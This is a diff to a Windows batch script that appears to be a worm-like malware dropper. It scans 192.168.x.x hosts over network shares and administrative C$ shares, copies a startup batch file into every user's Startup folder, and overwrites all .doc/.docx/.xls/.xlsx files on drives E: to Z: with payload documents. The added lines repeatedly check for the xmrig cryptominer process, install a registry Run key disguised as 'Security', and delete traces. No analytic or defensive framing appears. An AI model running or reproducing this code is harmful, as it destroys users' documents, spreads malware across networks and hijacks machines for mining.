@@ -55,6 +55,12 @@ if exist Y: (for /f %%u in ('dir Y:\Users /b') do copy /Y "C:\ProgramData\PSU\bg
 if exist Z: (for /f %%x in ('dir Z:\Users /b') do mkdir "Z:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
 
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -99,6 +105,12 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xlsx /s /b') do copy /Y "C:\Prog
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
+
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -145,6 +157,12 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do ren "%%h" *.xls)
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do ren "%%h" *.xls)
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do ren "%%h" *.xls)
 
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -189,6 +207,12 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xls /s /b') do copy /Y "C:\Progr
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
+
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 
 for /f %%x in ('net view \\192.168.%i%.%ii%') do pushd \\192.168.%i%.%ii%\%%x
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -244,6 +268,12 @@ if exist Y: (for /f %%u in ('dir Y:\Users /b') do copy /Y "C:\ProgramData\PSU\bg
 if exist Z: (for /f %%x in ('dir Z:\Users /b') do mkdir "Z:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
 
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -288,6 +318,12 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xlsx /s /b') do copy /Y "C:\Prog
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
+
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -334,6 +370,12 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do ren "%%h" *.xls)
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do ren "%%h" *.xls)
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do ren "%%h" *.xls)
 
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -378,6 +420,12 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xls /s /b') do copy /Y "C:\Progr
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
+
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 
 pushd \\192.168.%i%.%ii%\C$
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -433,6 +481,12 @@ if exist Y: (for /f %%u in ('dir Y:\Users /b') do copy /Y "C:\ProgramData\PSU\bg
 if exist Z: (for /f %%x in ('dir Z:\Users /b') do mkdir "Z:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
 
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -477,6 +531,12 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xlsx /s /b') do copy /Y "C:\Prog
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
+
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -523,6 +583,12 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do ren "%%h" *.xls)
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do ren "%%h" *.xls)
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do ren "%%h" *.xls)
 
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -567,6 +633,12 @@ if exist W: (for /f "delims=" %%h in ('dir W:\*.xls /s /b') do copy /Y "C:\Progr
 if exist X: (for /f "delims=" %%h in ('dir X:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xls /s /b') do copy /Y "C:\ProgramData\PSU\run.xls" "%%h")
+
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
